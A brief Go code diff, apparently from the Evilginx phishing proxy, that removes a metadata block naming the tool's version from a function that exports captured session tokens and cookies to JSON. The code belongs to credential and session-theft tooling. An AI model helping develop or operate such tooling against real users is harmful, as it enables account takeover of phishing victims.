@@ -86,11 +86,7 @@ func (p *HttpProxy) ExportSessionToJSON(session *Session, sessionID int) (string
 			BodyTokens:   session.BodyTokens,
 			HttpTokens:   session.HttpTokens,
 		},
-		Metadata: map[string]string{
-			"evilginx_version": "3.3.0",
-			"export_format":    "json",
-			"export_time":      timestamp.Format(time.RFC3339),
-		},
+
 	}
 
 	// Convert cookie tokens to exportable format
